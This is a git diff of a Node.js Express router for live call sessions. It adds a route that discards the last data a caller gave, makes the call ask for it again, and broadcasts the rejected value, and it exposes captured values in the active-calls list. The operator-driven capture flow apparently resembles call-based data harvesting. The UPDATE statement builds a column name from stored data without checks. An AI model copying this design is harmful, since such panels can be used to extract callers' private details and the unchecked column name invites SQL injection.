@@ -46,6 +46,45 @@ router.post('/request-action/:sessionId', async (req, res) => {
     }
 });
 
+// NEW: REJECT LAST DATA ROUTE
+router.post('/reject-data/:sessionId', async (req, res) => {
+    const { sessionId } = req.params;
+    const io = req.app.get('io');
+    
+    try {
+        const session = await db.query(
+            `SELECT last_data_type, last_data_value FROM call_sessions WHERE id = $1`,
+            [sessionId]
+        );
+        
+        if (session.rows.length === 0 || !session.rows[0].last_data_type) {
+            return res.json({ success: false, message: 'No data to reject' });
+        }
+        
+        const lastDataType = session.rows[0].last_data_type;
+        const lastDataValue = session.rows[0].last_data_value;
+        
+        // Clear the data from contacts
+        await db.query(
+            `UPDATE contacts SET ${lastDataType} = NULL WHERE id = (SELECT contact_id FROM call_sessions WHERE id = $1)`,
+            [sessionId]
+        );
+        
+        // Set session to ask again for the same data
+        await db.query(
+            `UPDATE call_sessions SET current_action = $1 WHERE id = $2`,
+            [`waiting_for_${lastDataType}`, sessionId]
+        );
+        
+        io.emit('data_rejected', { session_id: sessionId, type: lastDataType, value: lastDataValue });
+        
+        res.json({ success: true, message: `Rejected ${lastDataType}: ${lastDataValue}` });
+    } catch (error) {
+        console.error('Error rejecting data:', error);
+        res.status(500).json({ error: error.message });
+    }
+});
+
 router.post('/custom-voice/:sessionId', async (req, res) => {
     const { sessionId } = req.params;
     const { message } = req.body;
@@ -86,7 +125,7 @@ router.get('/contacts', async (req, res) => {
 router.get('/active-calls', async (req, res) => {
     try {
         const result = await db.query(
-            `SELECT cs.id as session_id, cs.call_sid, cs.current_action, cs.status, 
+            `SELECT cs.id as session_id, cs.call_sid, cs.current_action, cs.status, cs.last_data_type, cs.last_data_value,
                     c.phone_number, c.full_name
              FROM call_sessions cs
              JOIN contacts c ON cs.contact_id = c.id
